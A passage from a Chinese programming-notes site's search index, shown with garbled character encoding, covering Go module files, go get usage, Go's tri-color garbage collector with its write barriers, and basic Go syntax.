è¿™ä¸ªæ–‡ä»¶æè¿°äº†å½“å‰é¡¹ç›®ï¼ˆä¹Ÿå°±æ˜¯å½“å‰æ¨¡å—ï¼‰çš„å…ƒä¿¡æ¯ï¼Œæ¯ä¸€è¡Œéƒ½ä»¥ä¸€ä¸ªåŠ¨è¯å¼€å¤´ã€‚\nä¸€èˆ¬å¸¸ç”¨çš„åŠ¨è¯æœ‰ï¼š\n  moduleï¼šç”¨äºå®šä¹‰å½“å‰é¡¹ç›®çš„æ¨¡å—è·¯å¾„ã€‚æ¯”å¦‚ï¼š\nmodule github.com/eddycjy/module-repo   goï¼šç”¨äºæ ‡è¯†å½“å‰æ¨¡å—çš„ Go è¯­è¨€ç‰ˆæœ¬ï¼Œå€¼ä¸ºåˆå§‹åŒ–æ¨¡å—æ—¶çš„ç‰ˆæœ¬ã€‚æ¯”å¦‚ï¼š\ngo 1.13   requireï¼šç”¨äºè®¾ç½®ä¸€ä¸ªç‰¹å®šçš„æ¨¡å—ç‰ˆæœ¬ã€‚æ¯”å¦‚ï¼š\nrequire (  example.com/apple v0.1.2  example.com/banana v1.2.3  example.com/banana/v2 v2.3.4  example.com/pear // indirect  example.com/strawberry // incompatible )   excludeï¼šç”¨äºä»ä½¿ç”¨ä¸­æ’é™¤ä¸€ä¸ªç‰¹å®šçš„æ¨¡å—ç‰ˆæœ¬ã€‚æ¯”å¦‚ï¼š\nexclude example.com/banana v1.2.4   replaceï¼šç”¨äºå°†ä¸€ä¸ªæ¨¡å—ç‰ˆæœ¬æ›¿æ¢ä¸ºå¦å¤–ä¸€ä¸ªæ¨¡å—ç‰ˆæœ¬ã€‚æ¯”å¦‚ï¼š\nreplace example.com/apple v0.1.2 =\u0026gt; example.com/fried v0.1.0 replace example.com/banana =\u0026gt; example.com/fish   PostScriptï¼š\n go.sum æ–‡ä»¶ï¼šå­˜å‚¨ç€æ‹‰å–æ¨¡å—ä¾èµ–åï¼Œè¿™äº›æ¨¡å—çš„å“ˆå¸Œå€¼é˜²æ­¢å®ƒä»¬è¢«ç¯¡æ”¹ã€‚  go get è¡Œä¸º #  æ‹‰å–çš„è¿‡ç¨‹å¤§è‡´åˆ†ä¸ºä¸‰æ­¥ï¼šfinding å‘ç°ã€downloading ä¸‹è½½ã€extracting æå–ã€‚\nå¸¸ç”¨çš„ go get å‘½ä»¤ï¼š\n   å‘½ä»¤ ä½œç”¨     go get æ‹‰å–ä¾èµ–ï¼Œä¼šè¿›è¡ŒæŒ‡å®šæ€§æ‹‰å–ï¼ˆæ›´æ–°ï¼‰ï¼Œå¹¶ä¸ä¼šæ›´æ–°æ‰€ä¾èµ–çš„å…¶å®ƒæ¨¡å—ã€‚   go get -u æ›´æ–°ç°æœ‰çš„ä¾èµ–ï¼Œä¼šå¼ºåˆ¶æ›´æ–°å®ƒæ‰€ä¾èµ–çš„å…¶å®ƒå…¨éƒ¨æ¨¡å—ï¼Œä¸åŒ…æ‹¬è‡ªèº«ã€‚   go get -u -t ./\u0026hellip; æ›´æ–°æ‰€æœ‰ç›´æ¥ä¾èµ–å’Œé—´æ¥ä¾èµ–çš„æ¨¡å—ç‰ˆæœ¬ï¼ŒåŒ…æ‹¬å•å…ƒæµ‹è¯•ä¸­ç”¨åˆ°çš„ã€‚    æŒ‡å®šç‰ˆæœ¬çš„æ–¹å¼æœ‰ä»¥ä¸‹è¿™äº›ï¼š\n xxx@latest æœ€æ–°ç‰ˆæœ¬ï¼Œxxx@master å¯¹åº”åˆ†æ”¯çš„æœ€æ–° commitï¼Œxxx@v0.3.0 ä»“åº“ tag å¯¹åº”çš„ç‰ˆæœ¬ï¼Œxxx@342b2e commit çš„å“ˆå¸Œå€¼ï¼›  "},{"id":21,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/golang/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6/","title":"åƒåœ¾å›æ”¶","section":"Golang","content":"Golang GC #  å¸¸è§ GC ç®—æ³• #     åç§° æè¿° ä¼˜ç‚¹ ç¼ºç‚¹     å¼•ç”¨è®¡æ•° æ ¹æ®å¯¹è±¡è‡ªèº«çš„å¼•ç”¨è®¡æ•°æ¥å›æ”¶ï¼Œå½“å¼•ç”¨è®¡æ•°å½’é›¶æ—¶è¿›è¡Œå›æ”¶ã€‚ ç®€å•ç›´æ¥ï¼Œå›æ”¶é€Ÿåº¦å¿« éœ€è¦é¢å¤–çš„ç©ºé—´å­˜æ”¾è®¡æ•°ï¼›\néœ€è¦é¢‘ç¹æ›´æ–°è®¡æ•°ï¼›\næ— æ³•å¤„ç†å¾ªç¯å¼•ç”¨çš„æƒ…å†µï¼›   æ ‡è®°æ¸…é™¤ æ ‡è®°å‡ºæ‰€æœ‰ä¸éœ€è¦å›æ”¶çš„å¯¹è±¡ï¼Œåœ¨æ ‡è®°å®Œæˆåç»Ÿä¸€å›æ”¶æ‰æ‰€æœ‰æœªè¢«æ ‡è®°çš„å¯¹è±¡ã€‚ ç®€å•ç›´æ¥ï¼Œé€Ÿåº¦å¿« ä¼šé€ æˆä¸è¿ç»­çš„å†…å­˜ç©ºé—´ï¼ˆå†…å­˜ç¢ç‰‡ï¼‰\nä¸é€‚åˆå›æ”¶å¯¹è±¡è¿‡å¤šçš„åœºæ™¯   å¤åˆ¶æ³• å°†å†…å­˜åˆ†ä¸ºå¤§å°ç›¸åŒçš„ä¸¤å—ï¼Œæ¯æ¬¡ä½¿ç”¨å…¶ä¸­çš„ä¸€å—ï¼Œå½“è¿™ä¸€å—çš„å†…å­˜ä½¿ç”¨å®Œåï¼Œå°†è¿˜å­˜æ´»çš„å¯¹è±¡å¤åˆ¶åˆ°å¦ä¸€å—å»ï¼Œç„¶åå†æŠŠä½¿ç”¨çš„ç©ºé—´ä¸€æ¬¡æ¸…ç†æ‰ è§£å†³äº†å†…å­˜ç¢ç‰‡çš„é—®é¢˜ æ¯æ¬¡æ¸…é™¤é’ˆå¯¹çš„éƒ½æ˜¯æ•´å—å†…å­˜ï¼Œæ•ˆç‡ä½äºæ ‡è®°æ¸…é™¤æ³•ï¼›\næœ‰éƒ¨åˆ†å†…å­˜æ€»æ˜¯åˆ©ç”¨ä¸åˆ°ï¼Œèµ„æºæµªè´¹ï¼Œç§»åŠ¨å­˜æ´»å¯¹è±¡æ¯”è¾ƒè€—æ—¶ï¼Œå¹¶ä¸”å¦‚æœå­˜æ´»å¯¹è±¡è¾ƒå¤šçš„æ—¶å€™ï¼Œéœ€è¦æ‹…ä¿æœºåˆ¶ç¡®ä¿å¤åˆ¶åŒºæœ‰è¶³å¤Ÿçš„ç©ºé—´å¯å®Œæˆå¤åˆ¶ï¼›   æ ‡è®°æ•´ç† æ ‡è®°è¿‡ç¨‹åŒæ ‡è®°æ¸…é™¤æ³•ï¼Œç»“æŸåå°†å­˜æ´»å¯¹è±¡å‹ç¼©è‡³ä¸€ç«¯ï¼Œç„¶åæ¸…é™¤è¾¹ç•Œå¤–çš„å†…å®¹ã€‚ è§£å†³äº†å†…å­˜ç¢ç‰‡çš„é—®é¢˜ï¼Œä¹Ÿä¸åƒæ ‡è®°å¤åˆ¶æ³•é‚£æ ·éœ€è¦æ‹…ä¿æœºåˆ¶ï¼Œå­˜æ´»å¯¹è±¡è¾ƒå¤šçš„åœºæ™¯ä¹Ÿä½¿é€‚ç”¨ï¼› æ€§èƒ½ä½ï¼Œå› ä¸ºåœ¨ç§»åŠ¨å¯¹è±¡çš„æ—¶å€™ä¸ä»…éœ€è¦ç§»åŠ¨å¯¹è±¡è¿˜è¦ç»´æŠ¤å¯¹è±¡çš„å¼•ç”¨åœ°å€ï¼Œå¯èƒ½éœ€è¦å¯¹å†…å­˜ç»è¿‡å‡ æ¬¡æ‰«ææ‰èƒ½å®Œæˆï¼›   åˆ†ä»£å¼ å°†å¯¹è±¡æ ¹æ®å­˜æ´»æ—¶é—´çš„é•¿çŸ­è¿›è¡Œåˆ†ç±»ï¼Œå­˜æ´»æ—¶é—´å°äºæŸä¸ªå€¼çš„ä¸ºâ€œå¹´è½»ä»£â€ï¼Œå­˜æ´»æ—¶é—´å¤§äºæŸä¸ªå€¼çš„ä¸ºâ€œè€å¹´ä»£â€ï¼Œæ°¸è¿œä¸ä¼šå‚ä¸å›æ”¶çš„å¯¹è±¡ä¸ºâ€œæ°¸ä¹…ä»£â€ã€‚å¹¶æ ¹æ®åˆ†ä»£å‡è®¾ï¼ˆå¦‚æœä¸€ä¸ªå¯¹è±¡å­˜æ´»æ—¶é—´ä¸é•¿åˆ™å€¾å‘äºè¢«å›æ”¶ï¼Œå¦‚æœä¸€ä¸ªå¯¹è±¡å·²ç»å­˜æ´»å¾ˆé•¿æ—¶é—´åˆ™å€¾å‘äºå­˜æ´»æ›´é•¿æ—¶é—´ï¼‰å¯¹å¯¹è±¡è¿›è¡Œå›æ”¶ã€‚  STW å¯¹ç”¨æˆ·ä»£ç å½±å“å¤§    Golang GC #  Golang ä½¿ç”¨çš„åƒåœ¾æ¸…ç†ç®—æ³•æ˜¯â€œæ— åˆ†ä»£â€ã€â€œä¸æ•´ç†â€ã€â€œä¸ç”¨æˆ·ä»£ç å¹¶å‘æ‰§è¡Œâ€çš„ä¸‰è‰²æ ‡è®°æ¸…ç†ç®—æ³•ã€‚\nä¸ºä»€ä¹ˆ Golang ä¸ä½¿ç”¨â€œé¡ºåºå†…å­˜åˆ†é…å™¨â€ï¼Ÿ\n Go è¿è¡Œæ—¶çš„åˆ†é…ç®—æ³•åŸºäº tcmallocï¼ŒåŸºæœ¬ä¸Šæ²¡æœ‰ç¢ç‰‡é—®é¢˜ï¼Œå¯¹å¯¹è±¡è¿›è¡Œæ•´ç†ä¸ä¼šå¸¦æ¥å®è´¨æ€§çš„æ€§èƒ½æå‡ã€‚ å¹¶ä¸”é¡ºåºå†…å­˜åˆ†é…å™¨åœ¨å¤šçº¿ç¨‹çš„åœºæ™¯ä¸‹å¹¶ä¸é€‚ç”¨ã€‚  ä¸ºä»€ä¹ˆ Golang ä¸ä½¿ç”¨â€œåˆ†ä»£å‡è®¾â€ï¼Ÿ\n åˆ†ä»£å‡è®¾çš„ä¼˜ç‚¹åœ¨äºå¤„ç†çŸ­æ—¶é—´å­˜æ´»çš„æ–°åˆ›å»ºå¯¹è±¡ï¼Œä½†æ˜¯ Golang ä¼šé€šè¿‡â€œé€ƒé€¸åˆ†æâ€å°†å¤§éƒ¨åˆ†æ–°ç”Ÿå¯¹è±¡å­˜å‚¨åœ¨æ ˆä¸Šï¼Œæ‰€ä»¥åˆ†ä»£å‡è®¾åœ¨ Golang ä¸Šæ²¡æœ‰å¸¦æ¥ç›´æ¥çš„ä¼˜åŠ¿ï¼› Go çš„åƒåœ¾å›æ”¶å™¨ä¸ç”¨æˆ·ä»£ç å¹¶å‘æ‰§è¡Œï¼Œè¿™ä½¿å¾— STW çš„æ—¶é—´ä¸å¯¹è±¡çš„ä»£é™…ã€å¯¹è±¡çš„ size æ²¡æœ‰å…³ç³»ã€‚  ä¸‰è‰²æ ‡è®°åŸç† #  ä¸‰è‰²æ ‡è®°æ³•å°†å¯¹è±¡åˆ†ä¸ºä¸‰ç±»ï¼Œå¹¶ç”¨ä¸åŒçš„é¢œè‰²ç›¸ç§°ï¼š\n ç™½è‰²å¯¹è±¡ï¼ˆå¯èƒ½æ­»äº¡ï¼‰ï¼šæœªè¢«å›æ”¶å™¨è®¿é—®åˆ°çš„å¯¹è±¡ã€‚åœ¨å›æ”¶å¼€å§‹é˜¶æ®µï¼Œæ‰€æœ‰å¯¹è±¡å‡ä¸ºç™½è‰²ï¼Œå½“å›æ”¶ç»“æŸåï¼Œç™½è‰²å¯¹è±¡å‡ä¸å¯è¾¾ã€‚ ç°è‰²å¯¹è±¡ï¼ˆæ³¢é¢ï¼‰ï¼šå·²è¢«å›æ”¶å™¨è®¿é—®åˆ°çš„å¯¹è±¡ï¼Œä½†å›æ”¶å™¨éœ€è¦å¯¹å…¶ä¸­çš„ä¸€ä¸ªæˆ–å¤šä¸ªæŒ‡é’ˆè¿›è¡Œæ‰«æï¼Œå› ä¸ºä»–ä»¬å¯èƒ½è¿˜æŒ‡å‘ç™½è‰²å¯¹è±¡ã€‚ é»‘è‰²å¯¹è±¡ï¼ˆç¡®å®šå­˜æ´»ï¼‰ï¼šå·²è¢«å›æ”¶å™¨è®¿é—®åˆ°çš„å¯¹è±¡ï¼Œå…¶ä¸­æ‰€æœ‰å­—æ®µéƒ½å·²è¢«æ‰«æï¼Œé»‘è‰²å¯¹è±¡ä¸­ä»»ä½•ä¸€ä¸ªæŒ‡é’ˆéƒ½ä¸å¯èƒ½ç›´æ¥æŒ‡å‘ç™½è‰²å¯¹è±¡ã€‚  å…·ä½“çš„ç®—æ³•å®ç°æ˜¯ç»´æŠ¤ä¸€ä¸ªâ€œç°è‰²å¯¹è±¡é˜Ÿåˆ—â€ï¼Œä»â€œæ ¹å¯¹è±¡â€å¼€å§‹è¿›è¡Œâ€œå¹¿åº¦ä¼˜å…ˆéå†â€ã€‚å…¶ä¸­æ ¹å¯¹è±¡æ˜¯ä¸€ä¸ªé›†åˆï¼ŒåŒ…æ‹¬ï¼š\n  å…¨å±€å˜é‡ï¼šåœ¨ç¨‹åºç¼–è¯‘çš„æ—¶å€™å°±å·²ç»ç¡®å®šå­˜åœ¨äºæ•´ä¸ªç”Ÿå‘½å‘¨æœŸçš„å˜é‡ï¼›\n  æ‰§è¡Œæ ˆï¼šæ¯ä¸ª goroutine éƒ½åŒ…å«è‡ªå·±çš„æ‰§è¡Œæ ˆï¼Œè¿™äº›æ‰§è¡Œæ ˆä¸ŠåŒ…å«æ ˆä¸Šçš„å˜é‡åŠæŒ‡å‘åˆ†é…çš„å †å†…å­˜åŒºå—çš„æŒ‡é’ˆï¼›\n  å¯„å­˜å™¨ï¼šå¯„å­˜å™¨çš„å€¼å¯èƒ½è¡¨ç¤ºä¸€ä¸ªæŒ‡é’ˆï¼Œå‚ä¸è®¡ç®—çš„è¿™äº›æŒ‡é’ˆå¯èƒ½æŒ‡å‘æŸäº›èµ‹å€¼å™¨åˆ†é…çš„å †å†…å­˜åŒºå—ã€‚\n  å±éšœæœºåˆ¶ #  å¼•å…¥åŸå›  #  Golang GC æ˜¯æ²¡æœ‰ STW (Stop The World) çš„ï¼Œå®ƒçš„åƒåœ¾å›æ”¶å™¨æ˜¯ä¸ç”¨æˆ·ä»£ç å¹¶å‘æ‰§è¡Œçš„ã€‚\nä½†æ˜¯è¿™ä¸€æœºåˆ¶ä¼šå¯¼è‡´åœ¨ä¸‹é¢çš„è¿™ä¸ªå¹¶å‘æƒ…å†µä¸‹ï¼Œé”™è¯¯åœ°å›æ”¶äº†å¯¹è±¡ Bï¼š\n åœ¨åƒåœ¾å›æ”¶è¿›è¡Œåˆ°è¿™æ ·é˜¶æ®µæ—¶ï¼šç°è‰²å¯¹è±¡ A å¼•ç”¨äº†ç™½è‰²å¯¹è±¡ Bï¼Œé»‘è‰²å¯¹è±¡ C æ²¡æœ‰å¼•ç”¨ç™½è‰²å¯¹è±¡ Bï¼› ç”¨æˆ·ä»£ç ç§»é™¤äº†å¼•ç”¨ $$A \\rightarrow B$$ï¼Œå¢åŠ äº†å¼•ç”¨ $$C \\rightarrow B$$ï¼› å› ä¸º C å·²ç»è¢«æ ‡è®°ä¸ºé»‘è‰²å¯¹è±¡äº†ï¼ŒB å°±å°†ä¼šä¸€ç›´è¢«ä¿æŒä¸ºç™½è‰²å¯¹è±¡ç›´åˆ°æ‰«æç»“æŸï¼Œä»è€Œè¢«é”™è¯¯å›æ”¶ï¼›  å› ä¸º GC ä¸ç”¨æˆ·ä»£ç æ˜¯å¹¶è¡Œçš„ï¼Œæ‰€ä»¥ä¼šç ´åä¸‰è‰²æ ‡è®°æ³•åœ¨ STW ä¸‹è¿è¡Œçš„åŸºæœ¬å‡è®¾ï¼š\n   å‡è®¾ èŠ‚ç‚¹æ€§è´¨ V å…¥è¾¹æ€§è´¨ EN å‡ºè¾¹æ€§è´¨ EP     é»‘è‰²å¯¹è±¡å‡è®¾ B é»‘è‰²å¯¹è±¡ä¸€å®šæ˜¯å­˜æ´»å¯¹è±¡ ä¸€å®šå­˜åœ¨ä¸€ä¸ªé»‘è‰²å¯¹è±¡ åªèƒ½å¼•ç”¨ç°è‰²ã€é»‘è‰²å¯¹è±¡   ç°è‰²å¯¹è±¡å‡è®¾ G ç°è‰²å¯¹è±¡ä¸€å®šæ˜¯å­˜æ´»å¯¹è±¡ ä¸€å®šå­˜åœ¨ä¸€ä¸ªé»‘è‰²æˆ–ç°è‰²å¯¹è±¡ ğŸˆšï¸æ— é™åˆ¶   ç™½è‰²å¯¹è±¡å‡è®¾ W ç»“æŸæ—¶ï¼Œä¸€å®šä¸ºæ­»äº¡å¯¹è±¡ åªèƒ½è¢«ç°è‰²ã€ç™½è‰²å¯¹è±¡å¼•ç”¨ ğŸˆšï¸æ— é™åˆ¶    å…¶ä¸­æœ€é‡è¦çš„æ€§è´¨æ˜¯ W-Vï¼Œç ´åè¿™ä¸ªæ€§è´¨ä¼šç›´æ¥å¯¼è‡´ GC ç®—æ³•ä¸å¯ç”¨ã€‚\nç”¨æˆ·ä»£ç çš„è¿è¡Œå¯èƒ½ï¼š\n æ’å…¥æ–°çš„å¼•ç”¨è·¯å¾„ï¼šç ´åä¸Šé¢è¡¨æ ¼ä¸­çš„\u0026quot;B-EP\u0026quot;/\u0026ldquo;W-EN\u0026rdquo;/\u0026ldquo;W-V\u0026quot;ä¸‰ä¸ªæ€§è´¨ï¼› åˆ é™¤å·²æœ‰çš„å¼•ç”¨è·¯å¾„ï¼šç ´åä¸Šé¢è¡¨æ ¼ä¸­çš„\u0026quot;B-V\u0026rdquo;/\u0026ldquo;B-EN\u0026rdquo;/\u0026ldquo;G-V\u0026rdquo;/\u0026ldquo;G-EN\u0026quot;å››ä¸ªæ€§è´¨ï¼›  æ‰€ä»¥ Golang å¼•å…¥äº†å±éšœçš„æ¦‚å¿µï¼Œå³ï¼š\n åœ¨ç”¨æˆ·ä»£ç å¹¶è¡Œæ‰§è¡Œæ—¶ï¼ŒHook ç”¨æˆ·ä»£ç çš„ä¸€äº›æ“ä½œï¼Œæ¥å®ç°å­˜æ´»å¯¹è±¡ä¸ä¼šè¢«è¯¯æ¸…ç†çš„ç›®çš„ï¼›  Dijkstra å±éšœï¼šæ’å…¥è·¯å¾„ #  å³åœ¨ç”¨æˆ·ä»£ç æ’å…¥è·¯å¾„æ—¶æ‰§è¡Œä¸€äº›æ“ä½œï¼š\n å¦‚æœæ–°å»ºä¸€ä¸ªè·¯å¾„ $$A \\rightarrow B$$ï¼Œåˆ™å°† B å¯¹è±¡æ ‡è®°ä¸ºç°è‰²å¯¹è±¡ï¼› å¦‚æœå°†è·¯å¾„ $$A \\rightarrow C$$ æ›¿æ¢ä¸º $$A \\rightarrow B$$ï¼Œåˆ™å°† B å¯¹è±¡æ ‡è®°ä¸ºç°è‰²å¯¹è±¡ï¼›  è¿™ä¸€ç®—æ³•æœ‰ä»¥ä¸‹ç¼ºç‚¹ï¼š\n åœ¨æ’å…¥å±éšœä¸‹çš„ç»“æœæ˜¯å¿…è¦æ¡ä»¶ï¼Œèƒ½å¤Ÿç¡®ä¿ä¸è¢«è¯¯åˆ é™¤ï¼Œä½†ä¼šé—ç•™æœªæ¸…ç†åƒåœ¾ã€‚ æ¯æ¬¡å†™å…¥æ“ä½œéƒ½éœ€è¦æ‰§è¡Œé¢å¤–ä»£ç ä¼šé€ æˆæ€§èƒ½å¼€é”€ã€‚Golang åœ¨å®ç°æ—¶å®é™…åªå¯¹å †åŒºå¯¹è±¡åŠ å…¥äº†å†™å±éšœï¼Œæ ˆåŒºä»£ç ä¼šå‘ç”Ÿæ›´æ”¹åè¢«æ ‡è®°ï¼Œåœ¨æ‰«æç»“æŸåé€šè¿‡ STW é‡æ–°å¤„ç†ã€‚  Yuasa å±éšœï¼šåˆ é™¤è·¯å¾„ #  å³åœ¨ç”¨æˆ·ä»£ç åˆ é™¤è·¯å¾„æ—¶æ‰§è¡Œä¸€äº›æ“ä½œï¼š\n å¦‚æœåˆ é™¤è·¯å¾„ $$A \\rightarrow C$$ï¼Œä¸” C ä¹‹å‰ä¸ºç™½è‰²ï¼Œåˆ™ C è¢«æ ‡è®°ä¸ºç°è‰²ï¼› å¦‚æœå°†è·¯å¾„ $$A \\rightarrow C$$ æ›¿æ¢ä¸º $$A \\rightarrow B$$ï¼Œä¸” C ä¹‹å‰ä¸ºç™½è‰²ï¼Œåˆ™ C è¢«æ ‡è®°ä¸ºç°è‰²ï¼›  åˆ é™¤è·¯å¾„å¹¶æ²¡æœ‰è§£å†³åˆ é™¤å¯¼è‡´çš„ç ´åæ€§è´¨é—®é¢˜ï¼Œåè€Œæ˜¯æ·±åŒ–äº†è¿™äº›è¢«ç ´åçš„æ€§è´¨ã€‚è¿™æ˜¯å› ä¸ºåˆ é™¤å±éšœæœ¬è´¨è¿˜æ˜¯åœ¨è§£å†³æ’å…¥è·¯å¾„é‡åˆ°çš„é—®é¢˜ï¼Œç»´æŒæœ€é‡è¦çš„æ€§è´¨ W-V çš„æ­£ç¡®æ€§ã€‚\nHybrid å±éšœï¼šæ··åˆå±éšœ #  "},{"id":22,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/golang/%E8%8F%9C%E9%B8%9F%E6%95%99%E7%A8%8B/","title":"èœé¸Ÿæ•™ç¨‹","section":"Golang","content":"èœé¸Ÿæ•™ç¨‹ #  è¯­è¨€æ•™ç¨‹ #  è®¡ç®—æœºè½¯ä»¶ç»å†äº†æ•°åå¹´çš„å‘å±•ï¼Œå½¢æˆäº†å¤šç§å­¦æœ¯æµæ´¾ï¼Œæœ‰é¢å‘è¿‡ç¨‹ç¼–ç¨‹ã€é¢å‘å¯¹è±¡ç¼–ç¨‹ã€å‡½æ•°å¼ç¼–ç¨‹ã€é¢å‘æ¶ˆæ¯ç¼–ç¨‹ç­‰ï¼Œè¿™äº›æ€æƒ³ç©¶ç«Ÿå­°ä¼˜å­°åŠ£ï¼Œä¼—è¯´çº·çº­ã€‚\né™¤äº† OOP å¤–ï¼Œè¿‘å¹´å‡ºç°äº†ä¸€äº›å°ä¼—çš„ç¼–ç¨‹å“²å­¦ï¼ŒGo è¯­è¨€å¯¹è¿™äº›æ€æƒ³äº¦æœ‰æ‰€å¸æ”¶ã€‚ä¾‹å¦‚ï¼ŒGo è¯­è¨€æ¥å—äº†å‡½æ•°å¼ç¼–ç¨‹çš„ä¸€äº›æƒ³æ³•ï¼Œæ”¯æŒåŒ¿åå‡½æ•°ä¸é—­åŒ…ã€‚å†å¦‚ï¼ŒGoè¯­è¨€æ¥å—äº†ä»¥ Erlang è¯­è¨€ä¸ºä»£è¡¨çš„é¢å‘æ¶ˆæ¯ç¼–ç¨‹æ€æƒ³ï¼Œæ”¯æŒ goroutine å’Œé€šé“ï¼Œå¹¶æ¨èä½¿ç”¨æ¶ˆæ¯è€Œä¸æ˜¯å…±äº«å†…å­˜æ¥è¿›è¡Œå¹¶å‘ç¼–ç¨‹ã€‚æ€»ä½“æ¥è¯´ï¼ŒGo è¯­è¨€æ˜¯ä¸€ä¸ªéå¸¸ç°ä»£åŒ–çš„è¯­è¨€ï¼Œç²¾å°ä½†éå¸¸å¼ºå¤§ã€‚\nGo è¯­è¨€æœ€ä¸»è¦çš„ç‰¹æ€§ï¼š\n è‡ªåŠ¨åƒåœ¾å›æ”¶ æ›´ä¸°å¯Œçš„å†…ç½®ç±»å‹ å‡½æ•°å¤šè¿”å›å€¼ é”™è¯¯å¤„ç† åŒ¿åå‡½æ•°å’Œé—­åŒ… ç±»å‹å’Œæ¥å£ å¹¶å‘ç¼–ç¨‹ åå°„ è¯­è¨€äº¤äº’æ€§  è¯­æ³•åŸºç¡€ #   ä»…ä»…åˆ—ä¸¾ä¸€äº›å€¼å¾—æ³¨æ„çš„è¯­æ³•ã€‚\n æ•°æ®ç±»å‹ #  ä½¿ç”¨ fmt.Sprintf æ ¼å¼åŒ–å­—ç¬¦ä¸²å¹¶èµ‹å€¼ç»™æ–°ä¸²ï¼š\nfmt.Sprintf(\u0026#34;Code=%d\u0026amp;endDate=%s\u0026#34;, 123, \u0026#34;2020-12-31\u0026#34;); Go ä¸­æŒ‰ç±»åˆ«å¤§çº¦æœ‰ä»¥ä¸‹å‡ ç§æ•°æ®ç±»å‹ï¼š\n â€å¸ƒå°”å‹â€œã€â€œæ•°å­—å‹â€ã€â€œå­—ç¬¦ä¸²å‹â€ã€â€œæ´¾ç”Ÿç±»å‹â€ï¼› å…¶ä¸­â€œæ´¾ç”Ÿç±»å‹â€æœ‰ä»¥ä¸‹å‡ ç§ï¼šæŒ‡é’ˆç±»å‹ã€æ•°ç»„ç±»å‹ã€struct ç±»å‹ã€channel ç±»å‹ã€å‡½æ•°ç±»å‹ã€åˆ‡ç‰‡ç±»å‹ã€interface ç±»å‹ã€Map ç±»å‹ï¼›  å˜é‡ #  å˜é‡å£°æ˜æœ‰ä»¥ä¸‹å‡ ç§æ–¹å¼ï¼š\n// ä¸€æ¬¡å£°æ˜å¤šä¸ªå˜é‡ var identifier type  // æ ¹æ®å€¼è‡ªè¡Œåˆ¤å®šå˜é‡ç±»å‹ã€‚ var v_name = value  // çœç•¥ varï¼Œä½¿ç”¨ := å®šä¹‰ã€‚å·¦ä¾§å¦‚æœæ²¡æœ‰å£°æ˜æ–°çš„å˜é‡ï¼Œå°±äº§ç”Ÿç¼–è¯‘é”™è¯¯ v_name := value å£°æ˜å¤šå˜é‡çš„æ–¹å¼ï¼š\nvar vname1, vname2, vname3 type var (  vname1 v_type1  vname2 v_type2 ) var vname1, vname2, vname3 = v1, v2, v3 vname1, vname2, vname3 := v1, v2, v3 æŒ‡å®šå˜é‡ç±»å‹ï¼Œå¦‚æœæ²¡æœ‰åˆå§‹åŒ–ï¼Œåˆ™å˜é‡é»˜è®¤ä¸ºé›¶å€¼ï¼š\n falseã€0ã€\u0026quot;\u0026quot;ã€nilï¼›  å€¼ç±»å‹ã€å¼•ç”¨ç±»å‹ä¸ C++ ç±»ä¼¼ã€‚\nå¸¸é‡ #  å¸¸é‡å®šä¹‰å…³é”®è¯æ˜¯ constï¼Œä¸å˜é‡ç±»ä¼¼ï¼Œå®ƒçš„å®šä¹‰æ ¼å¼å¦‚ä¸‹ï¼š\nconst identifier [type] = value åœ¨ golang å¸¸é‡ä¸­æœ‰ä¸€ä¸ªç‰¹æ®Šçš„è¯­æ³• iotaï¼Œä¸‹é¢æ˜¯ä½¿ç”¨å®ä¾‹ï¼š\npackage main import \u0026#34;fmt\u0026#34;  func main() {  const (  a = iota //0  b //1  c //2  d = \u0026#34;ha\u0026#34; //ç‹¬ç«‹å€¼ï¼Œiota += 1  e //\u0026#34;ha\u0026#34; iota += 1  f = 100 //iota +=1  g //100 iota +=1  h = iota //7,æ¢å¤è®¡æ•°  i //8  )  fmt.Println(a,b,c,d,e,f,g,h,i) } æ¡ä»¶è¯­å¥ #  if æ¡ä»¶è¯­å¥ï¼š\n /* ä½¿ç”¨ if è¯­å¥åˆ¤æ–­å¸ƒå°”è¡¨è¾¾å¼ */  if a \u0026lt; 20 {  /* å¦‚æœæ¡ä»¶ä¸º true åˆ™æ‰§è¡Œä»¥ä¸‹è¯­å¥ */  fmt.Printf(\u0026#34;a å°äº 20\\n\u0026#34; )  } switch æ¡ä»¶è¯­å¥ï¼ˆé»˜è®¤ breakï¼Œä½¿ç”¨ fallthrough è¯­å¥æ‰§è¡Œä¸‹ä¸€ä¸ª caseï¼‰ï¼š\nfunc main() {  var x interface{}   switch i := x.(type) {  case nil:  fmt.Printf(\u0026#34; x çš„ç±»å‹ :%T\u0026#34;,i)  case int:  fmt.Printf(\u0026#34;x æ˜¯ int å‹\u0026#34;)  case float64:  fmt.Printf(\u0026#34;x æ˜¯ float64 å‹\u0026#34;)  case func(int) float64:  fmt.Printf(\u0026#34;x æ˜¯ func(int) å‹\u0026#34;)  case bool, string:  fmt.Printf(\u0026#34;x æ˜¯ bool æˆ– string å‹\u0026#34; )  default:  fmt.Printf(\u0026#34;æœªçŸ¥å‹\u0026#34;)  } } select è¯­å¥æ¥è‡ªäº Linux ä¸­çš„ select è¿™ä¸€ IO æ¨¡å¼ï¼ˆç°åœ¨å¸¸ç”¨çš„æ˜¯ epollï¼‰ï¼Œå®ƒæ˜¯ Go ä¸­çš„ä¸€ä¸ªæ§åˆ¶ç»“æ„ï¼Œç±»ä¼¼äºç”¨äºé€šä¿¡çš„ switch è¯­å¥ã€‚æ¯ä¸ª case å¿…é¡»æ˜¯ä¸€ä¸ªé€šä¿¡æ“ä½œï¼Œè¦ä¹ˆæ˜¯å‘é€è¦ä¹ˆæ˜¯æ¥æ”¶ã€‚\nselect éšæœºæ‰§è¡Œä¸€ä¸ªå¯è¿è¡Œçš„ caseã€‚å¦‚æœæ²¡æœ‰ case å¯è¿è¡Œï¼Œå®ƒå°†é˜»å¡ï¼Œç›´åˆ°æœ‰ case å¯è¿è¡Œã€‚ä¸€ä¸ªé»˜è®¤çš„å­å¥åº”è¯¥æ€»æ˜¯å¯è¿è¡Œçš„ã€‚\nåŸºæœ¬æ ¼å¼ï¼š\nselect {  case communication clause :  statement(s);  case communication clause :  statement(s);  /* ä½ å¯ä»¥å®šä¹‰ä»»æ„æ•°é‡çš„ case */  default : /* å¯é€‰ */  statement(s); } å¾ªç¯ #  go ä¸­åªä½¿ç”¨ for 